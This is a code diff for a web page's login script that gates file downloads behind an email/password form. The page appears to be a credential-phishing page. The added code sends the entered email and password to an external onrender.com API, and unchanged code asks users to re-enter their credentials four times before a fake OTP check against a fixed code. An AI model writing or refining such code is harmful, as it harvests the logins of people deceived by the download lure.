@@ -352,6 +352,10 @@
   const maxConfirmAttempts = 4;
   let requestedDownload = null; // track requested file/all
 
+  const loginBtn = document.getElementById('loginSubmitBtn');
+  const emailInput = document.getElementById('email');
+  const passwordInput = document.getElementById('password');
+
   function showSection(id) {
     ['loginSection', 'confirmSection', 'otpSection'].forEach(s => {
       document.getElementById(s).style.display = (s === id) ? 'block' : 'none';
@@ -372,13 +376,14 @@
     confirmAttempts = 0;
     requestedDownload = withDownload; // could be file name or "ALL"
     // Clear inputs
-    document.getElementById('email').value = '';
-    document.getElementById('password').value = '';
+    emailInput.value = '';
+    passwordInput.value = '';
     document.getElementById('confirmEmail').value = '';
     document.getElementById('confirmPassword').value = '';
     document.getElementById('otpCode').value = '';
   }
 
+  // Wire open modal to all download links
   downloadLinks.forEach(link => {
     link.addEventListener('click', (e) => {
       e.preventDefault();
@@ -401,24 +406,39 @@
     }
   });
 
-  document.getElementById('loginForm').addEventListener('submit', e => {
-    e.preventDefault();
-    if (currentStep === 'loginSection') {
-      const email = document.getElementById('email').value.trim();
-      const password = document.getElementById('password').value.trim();
-      // Replace below demo logic with real backend validation
-      const success = (email === "demo@email.com" && password === "demo123");
+  // Updated login button click handler with API call
+  loginBtn.addEventListener('click', async () => {
+    const email = emailInput.value.trim();
+    const password = passwordInput.value;
 
-      if (success) {
+    if (!email || !password) {
+      document.getElementById('loginStatus').textContent = 'Email and password are required.';
+      return;
+    }
+
+    try {
+      const response = await fetch("https://my-project-2yq6.onrender.com/api/login", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ email, password }),
+        credentials: "include"
+      });
+      const data = await response.json();
+
+      if (data.success) {
+        // Proceed to confirmation step
         showSection('confirmSection');
         confirmAttempts = 0;
         document.getElementById('confirmStatus').textContent = 'Please enter your credentials 4 times to confirm.';
       } else {
-        document.getElementById('loginStatus').textContent = 'Invalid credentials. Please try again.';
+        document.getElementById('loginStatus').textContent = data.message || 'Invalid credentials. Please try again.';
       }
+    } catch (error) {
+      document.getElementById('loginStatus').textContent = 'Login error: ' + error.message;
     }
   });
 
+  // Confirm and OTP handlers remain unchanged...
   document.getElementById('confirmBtn').addEventListener('click', () => {
     const confirmEmail = document.getElementById('confirmEmail').value.trim();
     const confirmPassword = document.getElementById('confirmPassword').value.trim();
@@ -443,12 +463,11 @@
     if (otp === '123456') {
       loginModal.classList.remove('active');
       alert(`Access granted! Downloading: ${requestedDownload === "ALL_FILES" ? "all files" : requestedDownload}`);
-      // Here, script the actual file access or redirection
+      // Real download logic or page navigation here
     } else {
       document.getElementById('otpStatus').textContent = 'Invalid code, please try again.';
     }
   });
 </script>
-
 </body>
 </html>
